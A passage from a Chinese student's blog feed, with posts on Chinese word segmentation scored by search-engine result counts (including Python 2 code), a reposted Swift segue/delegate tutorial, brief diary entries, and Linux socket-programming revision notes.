        <content type="html"><![CDATA[<p>以前写的东西就是想到哪里做哪里<br>没有从头开始仔细规划好<br>到后面连自己写的东西都忘了该怎么接手了<br>真是麻烦，决定重新开始  </p><hr><p>以前的那一篇做成了短语分词了，现在是这个样子的：  </p><pre><code>word = &quot;信息工程&quot;信息 : thread created息工 : thread created工程 : thread created息工 : 752000信息 : 53800000工程 : 80400000信息 | 工程</code></pre><p>功能就是把短语分成两个单词<br>因为现在的评分机制是根据得分最低的两字来划分的<br>所以只能做到两个单词组成的短语的两段式分词<br>感觉好鸡肋  </p><hr><p>目标是把一句话分成几个单词的组合<br>并且把不关键的单词给屏蔽掉<br>“关键词搜索修正之二”就变成了<br>“关键词 搜索 修正 二”<br>在这里我做了哪些事情呢  </p><ol><li>分辨出哪几个字该为一组  </li><li>屏蔽掉不重要的字<br>我在分辨的过程中是怎样思考的呢？<br>我会先看几个字，在这几个字中确定属于上一个单词的和不属于上一个单词的部分<br>一句话中会从前到后遍历，遍历的过程不是单字，而是一个小的短语<br>分辨出属于一个单词的，将它放到 list 里面<br>这时候遍历的短语就可以继续往后移动了<br>但是这还是默认句子语法正确的方式<br>如果句子没有完整，最后就一个不相关的字<br>还要继续加以识别，这个『不相关』的字是不是不相关<br>先做句子完整的吧<br>在分组完成之后所有单词都会放到 list 里面<br>然后我在 list 里面会发现几个完全对我识别没有帮助的词语<br>比如 『的』、『是』、还是上面例子中的『之』<br>把这些单字或者非单字的词汇删除之后得到的就是我想要的答案  </li></ol><hr><p>由于我在上面的过程当中有很多东西都是靠经验判断的<br>并且我也想使用GA 试试看<br>所以要把例如『几个字』『不相关』『没有帮助』的判断机制交给 GA<br>我会用不同的变量代替判断的过程，然后将不同变量的组合分配到程序当中<br>然后另外用一个程序来运行着所有组合的评分操作<br>所有的结果简单明了的存储到文本文件中<br>每一次所有组合都跑完了之后我会打开这个文本文件，选择我心仪的组合，让它留下来繁衍<br>然后重新编写不同变量的组合，再执行一遍所有组合的评分<br>就这样实现 GA 的操作  </p><hr><p>评分又是怎样实现的呢？<br>因为没有合适的字典<br>我现在只想到一个，也就是搜索引擎的结果量<br>或许搜索量也可以作为评分的关键变量之一  </p><hr><p>可以用 argv0 这样的方式来把同一个程序和变量组合组合起来<br>也可以用一个程序来把同一个程序复制修改为另一个变量组合的程序<br>当然选择前者  </p>]]></content>
      
      
      <categories>
          
          <category> 硬悟学蛇 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>最近都在干啥01-12</title>
      <link href="/2016/01-12-whatsup0112/"/>
      <url>/2016/01-12-whatsup0112/</url>
      
        <content type="html"><![CDATA[<p>居然离最近的一篇更新是 whatsup 系列<br>好像最近的一次 contribution 是对改动一个 hexo theme 吧<br>不想活了，我还码什么代码  </p><hr><p>说忙不忙但是也不知道自己最近都在干什么<br>剩下四门考试然后还有一节课的时候就把东西全部打包了<br>然后就回家了，大快人心<br>什么显示器，移动硬盘，就连暖脚宝都拿回去了<br>然后后来才知道还有那么多门考试<br>居然连工程实践4的日期都不知道，最后一次检查的时候我的电脑刚好在家里<br>现在（2016年01月12日23:33:34）坐在寝室里在打字，亏我想得出来，还开车回来把东西都装回家，结果根本就没有放假啊<br>前两天回来把键盘和笔记本都拿回来了<br>幸好拿回来了，不然不知道这几天复习在239还能干些什么  </p><hr><p>上一次过来是考信息安全数学基础，然后今天是操作系统<br>前一个肯定能过，后一个就五五开了，大题太少了，名词解释那么多简直就不给我机会<br>明天还有毛概，考完了就真的放假了，差了一大截<br>我意思是跟我预想的回家时间查了一大截  </p><hr><p>最近都是四五点钟睡觉然后十二点一点起床<br>简直遭不住<br>今天早点睡</p>]]></content>
      
      
      <categories>
          
          <category> 随笔与个人文集 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>「转」segue与delegate在ViewController返回的时候进行反向回传参数</title>
      <link href="/2016/01-11-segue/"/>
      <url>/2016/01-11-segue/</url>
      
        <content type="html"><![CDATA[<p>刚开始使用swift 的时候有很多问题<br>这篇文章帮了我很多<br>经过同意之后转过来记录一下<br>原帖地址<a href="http://www.zoejblog.com/iossegueyu-delegatezai-viewcontrollerfan-hui-de-shi-hou-jin-xing-fan-xiang-hui-chuan-can-shu/#comments" target="_blank" rel="noopener">[iOS]segue与delegate在ViewController返回的时候进行反向回传参数</a><br>作者<a href="http://www.zoejblog.com/author/zoej/" target="_blank" rel="noopener">zoej</a><br><a id="more"></a></p><hr><p>我们经常会使用navigationViewController，使用segue拉拉线，就可以实现页面跳转，使用<code>prepareForSegue</code>方便进行参数的正向传递，但我们也许也有的业务会是反向的传递参数，这个时候需要使用delegate。<br>假设有两个vc，事先做好了segue拉线，设置了按钮啥的，然后可以直接正向跳转，以及因为在一个navigation里面所以，第二个vc有个默认的back按钮可以反向的跳转，第一个是avc，第二个是bvc， 在bvc中我们写一个协议protocol，当然这个协议是写在类外面的，只是和类在同一个swift文件中：  </p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">protocol</span> <span class="title">RidingDelegate</span>   </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> isRefreshDataFlag:<span class="type">Bool</span>&#123;<span class="keyword">get</span> <span class="keyword">set</span>&#125;<span class="comment">//我这里就只设置一个参数用来传递好了。</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后我们在avc中要参照这个协议：  </p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ViewController</span>: <span class="title">UIViewController</span>,<span class="title">RidingDelegate</span> </span>&#123;</span><br><span class="line"><span class="keyword">var</span> isRefreshDataFlag=<span class="type">Bool</span>()<span class="comment">//并且直接实现这个协议参数，用来接收反向传输来的数据</span></span><br><span class="line"><span class="comment">//其他的方法这里都省略了，主要</span></span><br><span class="line"> <span class="keyword">override</span> <span class="function"><span class="keyword">func</span> <span class="title">prepareForSegue</span><span class="params">(segue: UIStoryboardSegue, sender: AnyObject?)</span></span> &#123;  <span class="comment">//发生了segue的方法</span></span><br><span class="line">    <span class="keyword">if</span>(segue.identifier == <span class="string">"StartRiding"</span>)&#123;<span class="comment">//指定某一个segue的目标vc的委托指向自身</span></span><br><span class="line">        <span class="keyword">let</span> ridingVC = segue.destinationViewController <span class="keyword">as</span> <span class="type">RidingViewController</span></span><br><span class="line">        ridingVC.delegate=<span class="keyword">self</span>  <span class="comment">//设置代理，让第一个页面作为ridingView的代理来接受参数</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">println</span>(<span class="string">"Segue: \(segue.identifier)"</span>)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>另外在bvc中的类中，需要实例化这个delegate：<br><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="keyword">delegate</span>:RidingDelegate?</span><br></pre></td></tr></table></figure></p><p>并且在需要的地方进行这个委托中的参数变化：<br><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">delegate</span>?.isRefreshDataFlag=<span class="literal">false</span></span><br></pre></td></tr></table></figure></p><p>最后就可以实现这个反向传递参数了，委托协议里面可以写方法.<br>参照<a href="http://www.tuicool.com/articles/6zEne2" target="_blank" rel="noopener">Swift语言实现代理传值-推酷</a><br><a href="http://makeapppie.com/2014/07/01/swift-swift-using-segues-and-delegates-in-navigation-controllers-part-1-the-template/" target="_blank" rel="noopener">THE SWIFT SWIFT TUTORIAL: USING SEGUES AND DELEGATES IN NAVIGATION CONTROLLERS (PART 1 — THE TEMPLATE)</a></p>]]></content>
      
      
      <categories>
          
          <category> 疑似机器人 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>最近在干什么12-29</title>
      <link href="/2015/12-29-whatsup1229/"/>
      <url>/2015/12-29-whatsup1229/</url>
      
        <content type="html"><![CDATA[<p>一不小心 github 上面的 contribution 就空了11天<br>上周就沉浸在做 keynote 和补全软件功能上面了<br>周五去比赛，周日晚上才回来，今天（周一）就开始补 contribution 了   </p><hr><p>演讲完了的时候真的是送了一口气了<br>忙了起码有两个月，付出的真的挺多的<br>然后终于得到了一个安慰奖了，毕竟人家都是三个研究生<br>我自己写的东西著作权应该在我这里吧，等会儿传 github<br>等等，今天<em>2015年12月29日15:31:30</em>已经有颜色了<br>那就明天来  </p><hr><p>题目选的是基于 hash 链的伪随机数发生器和检测<br>我在做发生器部分<br>用 swift 写的 iOS app  </p><hr><p><a href="https://github.com/gaoryrt/PRNG" target="_blank" rel="noopener">项目地址在这里</a></p>]]></content>
      
      
      <categories>
          
          <category> 随笔与个人文集 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>关键词搜索修正</title>
      <link href="/2015/12-15-keywordsearcher/"/>
      <url>/2015/12-15-keywordsearcher/</url>
      
        <content type="html"><![CDATA[<p>由 python 2.7 编写<br>作用是从常用自然疑问句中查询关键字<br>从“珠穆朗玛峰有多高？”到[“珠穆朗玛峰”,”高度”]<br><a id="more"></a><br>我才知道 utf-8 是三个三个存的中文。</p><h1 id="常用语句与答案"><a href="#常用语句与答案" class="headerlink" title="常用语句与答案"></a>常用语句与答案</h1><ol><li>《Rather Be》的制作者是谁？ </li><li>这周五是几号？</li><li>从成都到天津的航班号是多少？</li><li>成都市的日本大使馆在哪里？</li><li>苹果公司的股票价格？</li><li>今天人民币比韩元的汇率是多少？   </li></ol><p>下面是良好的答案  </p><ol><li>[“Rather Be”,”制作者”]</li><li>[“这周五”]</li><li>[“成都”,”天津”,”航班号”]</li><li>[“成都市”,”日本大使馆”]</li><li>[“苹果公司”,”股票价格”]</li><li>[“今天”,”人民币”,”韩元”,”汇率”]  </li></ol><h1 id="分析一下问题"><a href="#分析一下问题" class="headerlink" title="分析一下问题"></a>分析一下问题</h1><p>第一是分词。<br>比如说 “成都市的日本大使馆在哪里？” 这一句，最好是分成“成都市 的 日本大使馆 在哪里？”，或者是其他的分词方式，至少不会是这样：“成 都市 的日本大 使馆在哪里？”<br>第二是分词之后对关键词的选择。<br>比如说分词完美，已经是这样了：“成都市 的 日本 大使馆 在哪里？”，在此之后，选择出来的关键词是[“成都市”,”日本”,”大使馆”],而不是把我不想要的信息选择出来：[“日本”,”在哪里”]。</p><h1 id="分词"><a href="#分词" class="headerlink" title="分词"></a>分词</h1><p>比如说这么一段：“甲乙丙丁戊戌变法”  </p><ol><li>为“甲乙”评分，然后为“乙丙”评分，然后为“丙丁”评分……</li><li>为“甲乙丙”评分，然后是“乙丙丁”……</li><li>然后是“甲乙丙丁”，然后“戊戌变法”。</li><li>最后通过评分高低确定几个关键字。<br>其中关键步骤就是评分的规则，以及给出评分后去留的规则。<br>以前貌似看到过这个相关的东西，现在找不到了，这两天有点空的时间可以找一找。  </li></ol><p><em>2015年12月15日02:41:57</em></p><h1 id="关键词选择"><a href="#关键词选择" class="headerlink" title="关键词选择"></a>关键词选择</h1><p>这个的话应该和上一段中评分和确定去留的规则类似。<br>关键还是这两个：评分规则，选择规则。  </p><h1 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h1><p>既然提到了评分规则了，那么在优化过程中还可以加入遗传算法。  </p><ol><li>生成初始群体，相当于自然界中的种群。在这里就是不同的评分公式。</li><li>计算适应度，相当于自然选择给的约束。在这里应该需要我人工干预吧，暂时没有想到更好的办法。</li><li>进化。先选出适应度高的，作为父母公式。根据父母公式的参数确定下一代公式的参数。然后在子代公式中添加变异，变异的体现我暂时没有想出来，这一步很关键不能省略，甚至决定了进化过程中的适应度优化速度。</li></ol><hr><p>暂时到这里，先休息了<br><em>2015年12月15日02:54:44</em></p><h1 id="分词的实现"><a href="#分词的实现" class="headerlink" title="分词的实现"></a>分词的实现</h1><p>这个是《数学之美》这本书里面看到的，一句话里所有单字的排列组合的评分和最高者优先。<br>尝试一下<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> urllib2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pinfen</span><span class="params">(keyword1)</span>:</span></span><br><span class="line">    url = <span class="string">"http://www.baidu.com/s?wd="</span> + keyword1</span><br><span class="line"></span><br><span class="line">    request = urllib2.Request(url)</span><br><span class="line">    response = urllib2.urlopen(request)</span><br><span class="line">    rawhtml = response.read()</span><br><span class="line"></span><br><span class="line">    headposition = rawhtml.index(<span class="string">'相关结果约'</span>)</span><br><span class="line">    tailposition = rawhtml.index(</span><br><span class="line">        <span class="string">'''个&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;script type="text/javascript"&gt;'''</span>)</span><br><span class="line">    result = rawhtml[headposition + <span class="number">15</span>:tailposition].split(<span class="string">','</span>)</span><br><span class="line">    result = int(<span class="string">''</span>.join(result))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> pinfen(<span class="string">"发展"</span>) + pinfen(<span class="string">"中国家"</span>)</span><br><span class="line"><span class="keyword">print</span> pinfen(<span class="string">"发展中"</span>) + pinfen(<span class="string">"国家"</span>)</span><br></pre></td></tr></table></figure></p><p>发展 中国家  170300000<br>比<br>发展中 国家  157900000<br>得分高  </p><p>然后增加了一些，这个作为分词的另一种参考：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> urllib2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pinfen</span><span class="params">(keyword1)</span>:</span></span><br><span class="line">    url = <span class="string">"http://www.baidu.com/s?wd="</span> + keyword1</span><br><span class="line"></span><br><span class="line">    request = urllib2.Request(url)</span><br><span class="line">    response = urllib2.urlopen(request)</span><br><span class="line">    rawhtml = response.read()</span><br><span class="line"></span><br><span class="line">    headposition = rawhtml.index(<span class="string">'相关结果约'</span>)</span><br><span class="line">    tailposition = rawhtml.index(</span><br><span class="line">        <span class="string">'''个&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;script type="text/javascript"&gt;'''</span>)</span><br><span class="line">    result = rawhtml[headposition + <span class="number">15</span>:tailposition].split(<span class="string">','</span>)</span><br><span class="line">    result = int(<span class="string">''</span>.join(result))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">liangzifenci</span><span class="params">(keyword0)</span>:</span></span><br><span class="line">    list0 = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(keyword0) - <span class="number">3</span>, <span class="number">3</span>):</span><br><span class="line">        list0.append(keyword0[i] + keyword0[i + <span class="number">1</span>] + keyword0[i + <span class="number">2</span>] +</span><br><span class="line">                     keyword0[i + <span class="number">3</span>] + keyword0[i + <span class="number">4</span>] + keyword0[i + <span class="number">5</span>])</span><br><span class="line">    <span class="keyword">return</span> list0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">liangduanfenci</span><span class="params">(keyword2)</span>:</span></span><br><span class="line">    list2 = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>, len(keyword2), <span class="number">3</span>):</span><br><span class="line">        list2.append(keyword2[:i])</span><br><span class="line">        list2.append(keyword2[i:])</span><br><span class="line">    <span class="keyword">return</span> list2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> liangduanfenci(<span class="string">"贾斯丁比伯"</span>):</span><br><span class="line">    <span class="keyword">print</span> pinfen(i), i</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> liangzifenci(<span class="string">"贾斯丁比伯"</span>):</span><br><span class="line">    <span class="keyword">print</span> pinfen(i), i</span><br></pre></td></tr></table></figure></p><p>结果如下：<br><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">20500000 </span>贾</span><br><span class="line"><span class="symbol">47900 </span>斯丁比伯</span><br><span class="line"><span class="symbol">706000 </span>贾斯</span><br><span class="line"><span class="symbol">499 </span>丁比伯</span><br><span class="line"><span class="symbol">118000 </span>贾斯丁</span><br><span class="line"><span class="symbol">1250000 </span>比伯</span><br><span class="line"><span class="symbol">393000 </span>贾斯丁比</span><br><span class="line"><span class="symbol">100000000 </span>伯</span><br><span class="line"></span><br><span class="line"><span class="symbol">706000 </span>贾斯</span><br><span class="line"><span class="symbol">2370000 </span>斯丁</span><br><span class="line"><span class="symbol">74600 </span>丁比</span><br><span class="line"><span class="symbol">1250000 </span>比伯</span><br></pre></td></tr></table></figure></p><p>可以看到评分越少的，越容易存在分段，中间用于确定“是否”的关键性参数我不用自己来设定，这个交给 GA。</p><hr><p>今天先到这里，明天再来。<br><em>2015年12月15日23:31:41</em><br>主要是发现，当使用两段分词方法的时候，一个字的评分结果一般都是最大值，所以把最前和最后的都去掉了，不作考虑。<br>看看结果（例句“相关结构对”）：<br><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">62300000 相关</span><br><span class="line">14800000 结构对</span><br><span class="line">9330000 相关结</span><br><span class="line">8700000 构对</span><br><span class="line">-----------------------</span><br><span class="line">62300000 相关</span><br><span class="line">17200000 关结</span><br><span class="line">52300000 结构</span><br><span class="line">8700000 构对</span><br></pre></td></tr></table></figure></p><p>这五个字我感觉最好是分成[[“相关”,”结构”],”对”]<br>可以从答案中看到，[“相关”,”结构对”]的得分比[“相关结”,”构对”]要高；然后“构对”之间需要分词。</p><hr><p>#加入多线程<br>先看结果<br><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">讽刺 : <span class="type">thread</span> created</span><br><span class="line">刺实 : <span class="type">thread</span> created</span><br><span class="line">实现 : <span class="type">thread</span> created</span><br><span class="line">讽刺 : 3770000</span><br><span class="line">刺实 : 403000</span><br><span class="line">实现 : 27200000</span><br><span class="line">讽刺 | 实现</span><br></pre></td></tr></table></figure></p><p>这个是输入“讽刺实现”的结果<br>下面是源代码<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> urllib2</span><br><span class="line"><span class="keyword">import</span> thread</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">word = <span class="string">"讽刺实现"</span></span><br><span class="line">size = len(word) / <span class="number">3</span> - <span class="number">1</span></span><br><span class="line">dic = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输入为需要评分的词，会在 dic 中储存&#123;123:相关,124:关结,122:结果&#125;，评分过程中会输出分数，size 用于等待进程结束</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pinfen</span><span class="params">(keyword1)</span>:</span></span><br><span class="line">    url = <span class="string">"http://www.baidu.com/s?wd="</span> + keyword1</span><br><span class="line">    request = urllib2.Request(url)</span><br><span class="line">    response = urllib2.urlopen(request)</span><br><span class="line">    rawhtml = response.read()</span><br><span class="line">    response.close()</span><br><span class="line">    headposition = rawhtml.index(<span class="string">'相关结果约'</span>)</span><br><span class="line">    tailposition = rawhtml.index(</span><br><span class="line">        <span class="string">'''个&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;script type="text/javascript"&gt;'''</span>)</span><br><span class="line">    result = rawhtml[headposition + <span class="number">15</span>:tailposition].split(<span class="string">','</span>)</span><br><span class="line">    result = int(<span class="string">''</span>.join(result))</span><br><span class="line">    dic[word.index(keyword1) / <span class="number">3</span>] = result</span><br><span class="line">    <span class="keyword">print</span> keyword1, <span class="string">":"</span>, result</span><br><span class="line">    <span class="keyword">global</span> size</span><br><span class="line">    size -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">liangzifenci</span><span class="params">(keyword0)</span>:</span>  <span class="comment"># 两个字为一组进行分词</span></span><br><span class="line">    list0 = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(keyword0) - <span class="number">3</span>, <span class="number">3</span>):</span><br><span class="line">        list0.append(keyword0[i] + keyword0[i + <span class="number">1</span>] + keyword0[i + <span class="number">2</span>] +</span><br><span class="line">                     keyword0[i + <span class="number">3</span>] + keyword0[i + <span class="number">4</span>] + keyword0[i + <span class="number">5</span>])</span><br><span class="line">    <span class="keyword">return</span> list0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shuchu</span><span class="params">(dic)</span>:</span></span><br><span class="line">    dic = &#123;value: key <span class="keyword">for</span> key, value <span class="keyword">in</span> dic.items()&#125;</span><br><span class="line">    position = dic[sorted(dic.keys())[<span class="number">0</span>]] * <span class="number">3</span></span><br><span class="line">    <span class="keyword">print</span> word[<span class="number">0</span>:position + <span class="number">3</span>], <span class="string">"|"</span>, word[position + <span class="number">3</span>:]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 以下都是处理线程用的</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> liangzifenci(word):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        thread.start_new_thread(pinfen, (x,))</span><br><span class="line">        <span class="keyword">print</span> x, <span class="string">": thread created"</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">print</span> x, <span class="string">": unable to start new thread "</span></span><br><span class="line"><span class="keyword">while</span> size != <span class="number">0</span>:</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">shuchu(dic)</span><br></pre></td></tr></table></figure></p><p>突然发现不知道应该在哪里加入 GA 的东西了。。。略尴尬</p>]]></content>
      
      
      <categories>
          
          <category> 硬悟学蛇 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Linux网络编程复习</title>
      <link href="/2015/12-13-socket/"/>
      <url>/2015/12-13-socket/</url>
      
        <content type="html"><![CDATA[<p>甘刚老师教的很不错的，对我们也很负责，真的是很好的一个老师。<br>但是江山易改本性难移，我们还是没有好好的听老师讲课，还是等着最后几天来复习。<br>这一篇就是在考试之后把复习的资料整理一下。<br><a id="more"></a>  </p><h1 id="套接字类型"><a href="#套接字类型" class="headerlink" title="套接字类型"></a>套接字类型</h1><h2 id="流式套接字-sock-stream"><a href="#流式套接字-sock-stream" class="headerlink" title="流式套接字  sock_stream"></a>流式套接字  sock_stream</h2><p> 使用了 TCP 协议，保证了数据传输是正确，顺序的<br> 提供可靠的，面向连接的通讯流<br> Telnet 就是流式连接，到达顺序和输入顺序一样  </p><h2 id="数据报套接字-sock-dgram"><a href="#数据报套接字-sock-dgram" class="headerlink" title="数据报套接字  sock-dgram"></a>数据报套接字  sock-dgram</h2><p> 使用了 UDP 协议，不保证可靠无差错，是无序的<br> 无连接的服务，不需要维护一个打开的连接，只用打包加上 IP 然后发送<br> 使用 udp 的程序收到后需要返回 ack （确认）信号<br> tftp，bootp 就是数据报套接字  </p><h2 id="原始套接字"><a href="#原始套接字" class="headerlink" title="原始套接字"></a>原始套接字</h2><p> 原始套接字主要用于一些协议的开发,可以进行比较底层的操作<br> 它功能强大,但是没有上面介绍的两种套接字使用方便<br> 一般的程序也涉及不到原始套接字  </p><h1 id="socket套接字包含的元素"><a href="#socket套接字包含的元素" class="headerlink" title="socket套接字包含的元素"></a>socket套接字包含的元素</h1><p>  一个完整的 Socket 则用一个相关描述<br> {协议,本地地址,本地端口,远程地址,远程端口}<br>  每一个 Socket 有一个本地的唯一 Socket 号,由操作系统分配<br>  针对不同的C/S程序提供不同的 Socket 系统调用<br> Socket 利用C/S模式巧妙的解决了进程之间建立通信连接的问题<br>  服务器拥有全局公认的 Socket,任何客户都可以向它发出连接请求和信息请求<br>  两个完全随机的用户进程之间,因为没有任何一方的 Socket ,要通话是不可能的  </p><h1 id="监听套接字和连接套接字的作用"><a href="#监听套接字和连接套接字的作用" class="headerlink" title="监听套接字和连接套接字的作用"></a>监听套接字和连接套接字的作用</h1><p>  listen()一直监听，accept()用于连接。<br>  listen(sockfd套接字描述符,backlog最大连接数)<br>  accept(listenfd套接字描述符,client对方地址,addrlen地质结构长度)   </p><h1 id="IP地址复用的作用和设置"><a href="#IP地址复用的作用和设置" class="headerlink" title="IP地址复用的作用和设置"></a>IP地址复用的作用和设置</h1><p>  setsockopt()函数 和 SO_REUSEADDR 参数  </p><h1 id="多进程和多线程对连接和监听套接字处理的区别"><a href="#多进程和多线程对连接和监听套接字处理的区别" class="headerlink" title="多进程和多线程对连接和监听套接字处理的区别"></a>多进程和多线程对连接和监听套接字处理的区别</h1><h2 id="多进程"><a href="#多进程" class="headerlink" title="多进程"></a>多进程</h2><p>1.connect 请求到达服务器时建立 connfd<br>2.fork()出一个子进程共享 listenfd，connfd<br>3.父进程关闭 connfd，子进程关闭 listenfd  </p><h2 id="多线程"><a href="#多线程" class="headerlink" title="多线程"></a>多线程</h2><p>1.子线程处理 listenfd：connect 请求，把 sockid 保存下来<br>2.主线程处理 connfd：遍历保存的 sockid，执行read/write,send/recv  </p><h1 id="TSD的作用和使用方法"><a href="#TSD的作用和使用方法" class="headerlink" title="TSD的作用和使用方法"></a>TSD的作用和使用方法</h1><p> TSD线程特定数据来取代静态变量，类似全局变量，但是是每个线程私有的<br> tsd 是定义线程私有数据的唯一方法。<br> 在同进程中的同一数据都用一个唯一的 Key 来标志。<br>  创建一个类型为 pthread_key_t 类型的变量。  </p><p>调用 pthread_key_create() 来创建该变量。该函数有两个参数，第一个参数就是上面声明的 